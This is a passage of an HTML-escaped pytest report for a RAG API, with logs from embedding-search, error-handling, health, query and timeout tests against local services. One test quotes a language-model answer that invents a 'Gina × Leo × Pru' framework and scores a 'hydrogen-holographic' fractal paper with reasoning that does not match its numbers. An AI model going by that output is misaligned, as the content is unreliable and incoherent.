09:24:55 - rag_api.analysis.embedding_search - INFO - Reranking 2 results with criteria: [&amp;#x27;text_length&amp;#x27;]\n2025-12-18 09:24:55 - rag_api.analysis.embedding_search - INFO - Results reranked\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\nINFO     rag_api.analysis.embedding_search:embedding_search.py:141 Searching 10 embeddings with top_k=5\nINFO     rag_api.analysis.embedding_search:embedding_search.py:169 Found 2 results above threshold 0.0\nINFO     rag_api.analysis.embedding_search:embedding_search.py:285 Reranking 2 results with criteria: [&amp;#x27;text_length&amp;#x27;]\nINFO     rag_api.analysis.embedding_search:embedding_search.py:330 Results reranked\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:55 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:24:57 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n2025-12-18 09:24:57 - rag_api.analysis.embedding_search - INFO - Searching 10 embeddings with top_k=3\n2025-12-18 09:24:57 - rag_api.analysis.embedding_search - INFO - Found 3 results above threshold 0.0\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\nINFO     rag_api.analysis.embedding_search:embedding_search.py:141 Searching 10 embeddings with top_k=3\nINFO     rag_api.analysis.embedding_search:embedding_search.py:169 Found 3 results above threshold 0.0\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding_edge_cases&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_embedding_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:57 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:25:00 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n2025-12-18 09:25:00 - rag_api.analysis.embedding_search - INFO - Searching 10 embeddings with top_k=10\n2025-12-18 09:25:00 - rag_api.analysis.embedding_search - INFO - Found 0 results above threshold 0.9\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\nINFO     rag_api.analysis.embedding_search:embedding_search.py:141 Searching 10 embeddings with top_k=10\nINFO     rag_api.analysis.embedding_search:embedding_search.py:169 Found 0 results above threshold 0.9\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_text&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_text&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_search_by_text&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:25:00 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:25:02 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n2025-12-18 09:25:02 - rag_api.analysis.embedding_search - INFO - Searching 10 embeddings with top_k=2\n2025-12-18 09:25:02 - rag_api.analysis.embedding_search - INFO - Found 2 results above threshold 0.0\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\nINFO     rag_api.analysis.embedding_search:embedding_search.py:141 Searching 10 embeddings with top_k=2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:169 Found 2 results above threshold 0.0\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_compute_cosine_similarity_batch&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_compute_cosine_similarity_batch&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestAnalysisUtils::test_compute_cosine_similarity_batch&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_extract_embeddings_array&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_extract_embeddings_array&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestAnalysisUtils::test_extract_embeddings_array&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_normalize_embeddings&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestAnalysisUtils::test_normalize_embeddings&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestAnalysisUtils::test_normalize_embeddings&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestRAGEngineEnhancements::test_rag_engine_with_analysis&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestRAGEngineEnhancements::test_rag_engine_with_analysis&#34;, &#34;duration&#34;: &#34;214 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestRAGEngineEnhancements::test_rag_engine_with_analysis&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;214 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestAnalysisPerformance::test_large_dataset_performance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestAnalysisPerformance::test_large_dataset_performance&#34;, &#34;duration&#34;: &#34;65 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestAnalysisPerformance::test_large_dataset_performance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;65 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:25:02 - rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 50 embeddings\n2025-12-18 09:25:02 - rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 50 embeddings\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\n\n&#34;}], &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_error_scenarios&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_error_scenarios&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_api.py::TestRAGAPI::test_rag_api_error_scenarios&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rag_api_error_scenarios - PASSED\nDuration: 1.92s\nCategory: integration\nMetrics:\n  error_invalid_json_status: 422\n  error_missing_query_status: 422\n  error_invalid_top_k_status: 422\n  error_negative_top_k_status: 200\n  error_empty_payload_status: 422\n  error_null_query_status: 422\n  error_handling_success_rate: 0.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:25:03,443 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1467ba9c0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:25:03,443 - TestRAGAPI.test_rag_api_error_scenarios - INFO - Testing RAG API error scenarios\n2025-12-18 09:25:03,446 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  invalid_json: got 422, expected 400\n2025-12-18 09:25:03,449 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  missing_query: got 422, expected 400\n2025-12-18 09:25:03,452 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  invalid_top_k: got 422, expected 400\n2025-12-18 09:25:04,344 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  negative_top_k: got 200, expected 400\n2025-12-18 09:25:04,346 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  empty_payload: got 422, expected 400\n2025-12-18 09:25:04,347 - TestRAGAPI.test_rag_api_error_scenarios - WARNING - \u26a0\ufe0f  null_query: got 422, expected 400\n2025-12-18 09:25:04,347 - TestRAGAPI.test_rag_api_error_scenarios - INFO - \u2705 Error scenarios: 0/6 properly handled (0.0%)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1467ba9c0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:390 Testing RAG API error scenarios\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  invalid_json: got 422, expected 400\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  missing_query: got 422, expected 400\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  invalid_top_k: got 422, expected 400\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  negative_top_k: got 200, expected 400\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  empty_payload: got 422, expected 400\nWARNING  TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:400 \u26a0\ufe0f  null_query: got 422, expected 400\nINFO     TestRAGAPI.test_rag_api_error_scenarios:test_framework.py:390 \u2705 Error scenarios: 0/6 properly handled (0.0%)\n\n&#34;}], &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_health&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Failed&#34;, &#34;testId&#34;: &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_health&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Failed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_api.py::TestRAGAPI::test_rag_api_health&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;tests/test_rag_api.py:37: in test_rag_api_health\n    self.require_service(&amp;quot;rag_api&amp;quot;)\ntests/test_framework.py:905: in require_service\n    self.fail(f&amp;quot;{service_name} service not available - tests should ensure services are started&amp;quot;)\nE   AssertionError: rag_api service not available - tests should ensure services are started\n\n----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rag_api_health - PASSED\nDuration: 1.01s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:25:05,359 - TestRAGAPI.test_rag_api_health - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x13ce0c490&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:25:05,359 - TestRAGAPI.test_rag_api_health - INFO - Testing RAG API health endpoint\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestRAGAPI.test_rag_api_health:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x13ce0c490&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestRAGAPI.test_rag_api_health:test_framework.py:390 Testing RAG API health endpoint\n\n&#34;}], &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_large_query_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_large_query_handling&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_api.py::TestRAGAPI::test_rag_api_large_query_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rag_api_large_query_handling - PASSED\nDuration: 2.36s\nCategory: integration\nMetrics:\n  large_query_response_time: 1.34\n  large_query_answer_length: 2561\n  large_query_success: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:25:06,393 - TestRAGAPI.test_rag_api_large_query_handling - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1467ba030&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:25:06,393 - TestRAGAPI.test_rag_api_large_query_handling - INFO - Testing RAG API large query handling\n2025-12-18 09:25:07,737 - TestRAGAPI.test_rag_api_large_query_handling - INFO - \u2705 Large query handled successfully in 1.34s\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestRAGAPI.test_rag_api_large_query_handling:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x1467ba030&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestRAGAPI.test_rag_api_large_query_handling:test_framework.py:390 Testing RAG API large query handling\nINFO     TestRAGAPI.test_rag_api_large_query_handling:test_framework.py:390 \u2705 Large query handled successfully in 1.34s\n\n&#34;}], &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Failed&#34;, &#34;testId&#34;: &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Failed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;tests/test_rag_api.py:48: in test_rag_api_query\n    self.require_service(&amp;quot;rag_api&amp;quot;)\ntests/test_framework.py:905: in require_service\n    self.fail(f&amp;quot;{service_name} service not available - tests should ensure services are started&amp;quot;)\nE   AssertionError: rag_api service not available - tests should ensure services are started\n\n----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rag_api_query - PASSED\nDuration: 1.02s\nCategory: integration\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:25:08,759 - TestRAGAPI.test_rag_api_query - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146ede250&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:25:08,760 - TestRAGAPI.test_rag_api_query - INFO - Testing RAG API query functionality\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestRAGAPI.test_rag_api_query:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146ede250&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestRAGAPI.test_rag_api_query:test_framework.py:390 Testing RAG API query functionality\n\n&#34;}], &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query_variations&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query_variations&#34;, &#34;duration&#34;: &#34;00:01:37&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_api.py::TestRAGAPI::test_rag_api_query_variations&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:01:37&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_rag_api_query_variations - PASSED\nDuration: 97.36s\nCategory: integration\nMetrics:\n  query_1_response_time: 11.09\n  query_1_answer_length: 1996\n  query_1_sources_count: 3\n  query_2_response_time: 13.37\n  query_2_answer_length: 2714\n  query_2_sources_count: 3\n  query_3_response_time: 13.77\n  query_3_answer_length: 953\n  query_3_sources_count: 3\n  query_4_response_time: 14.48\n  query_4_answer_length: 2570\n  query_4_sources_count: 3\n  query_5_response_time: 14.28\n  query_5_answer_length: 2585\n  query_5_sources_count: 3\n  query_6_response_time: 14.00\n  query_6_answer_length: 1843\n  query_6_sources_count: 3\n  query_7_response_time: 15.35\n  query_7_answer_length: 2113\n  query_7_sources_count: 3\n  query_variations_success_rate: 100.00\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:25:09,794 - TestRAGAPI.test_rag_api_query_variations - WARNING - frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x145fe9260&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\n2025-12-18 09:25:09,795 - TestRAGAPI.test_rag_api_query_variations - INFO - Testing RAG API query variations\n2025-12-18 09:25:20,889 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 1 successful: 1996 chars, 3 sources\n2025-12-18 09:25:34,258 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 2 successful: 2714 chars, 3 sources\n2025-12-18 09:25:48,027 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 3 successful: 953 chars, 3 sources\n2025-12-18 09:26:02,504 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 4 successful: 2570 chars, 3 sources\n2025-12-18 09:26:16,786 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 5 successful: 2585 chars, 3 sources\n2025-12-18 09:26:30,789 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 6 successful: 1843 chars, 3 sources\n2025-12-18 09:26:46,137 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query 7 successful: 2113 chars, 3 sources\n2025-12-18 09:26:46,137 - TestRAGAPI.test_rag_api_query_variations - INFO - \u2705 Query variations: 7/7 successful (100.0%)\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestRAGAPI.test_rag_api_query_variations:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x145fe9260&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 Testing RAG API query variations\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 1 successful: 1996 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 2 successful: 2714 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 3 successful: 953 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 4 successful: 2570 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 5 successful: 2585 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 6 successful: 1843 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query 7 successful: 2113 chars, 3 sources\nINFO     TestRAGAPI.test_rag_api_query_variations:test_framework.py:390 \u2705 Query variations: 7/7 successful (100.0%)\n\n&#34;}], &#34;tests/test_rag_pod_query.py::test_pod_evaluation_query&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_pod_query.py::test_pod_evaluation_query&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_pod_query.py::test_pod_evaluation_query&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n======================================================================\nTesting RAG API with PoD Evaluation Query\n======================================================================\n\n[1] Checking RAG API health...\n   \u2705 Health check passed\n\n[2] Sending PoD evaluation query to RAG API...\n   Query length: 623 characters\n   System prompt length: 782 characters\n   Sending request (timeout: 180s - this may take 30-120 seconds)...\n   Status Code: 200\n   Response time: 1.38 seconds\n   \u2705 Query successful\n\n   Response:\n   - Answer length: 2251 characters\n   - Sources found: 5\n\n   Answer preview:\n   To evaluate the artifact, I will apply the Gina \u00d7 Leo \u00d7 Pru framework, which stands for G - Gleaning (contextual understanding), L - Laying (structure and organization), and P - Projection (evaluation).\n\n**G - Gleaning:**\nFrom the context, I understand that the artifact is a scientific paper on fractal structures in quantum systems. The paper proposes a novel approach using a hydrogen-holographic framework, which links atomic geometry to cognitive fractal structures.\n\n**L - Laying:**\nThe artifac...\n\n   \u2705 Found JSON in response:\n   {\n  &amp;quot;coherence&amp;quot;: 5000,\n  &amp;quot;density&amp;quot;: 6500,\n  &amp;quot;redundancy&amp;quot;: 0,\n  &amp;quot;epoch_weight&amp;quot;: 1.0,\n  &amp;quot;pod_score&amp;quot;: 325000,\n  &amp;quot;tier&amp;quot;: &amp;quot;gold&amp;quot;,\n  &amp;quot;epoch&amp;quot;: &amp;quot;pioneer&amp;quot;,\n  &amp;quot;status&amp;quot;: &amp;quot;approved&amp;quot;,\n  &amp;quot;reasoning&amp;quot;: &amp;quot;High PoD score due to moderate coherence and high density, with no redundancy.&amp;quot;\n}\n&#34;}], &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_concurrent_request_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_timeout.py::TestRAGTimeout::test_concurrent_request_handling&#34;, &#34;duration&#34;: &#34;00:00:40&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_timeout.py::TestRAGTimeout::test_concurrent_request_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:40&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_concurrent_request_handling - PASSED\nDuration: 39.68s\nCategory: 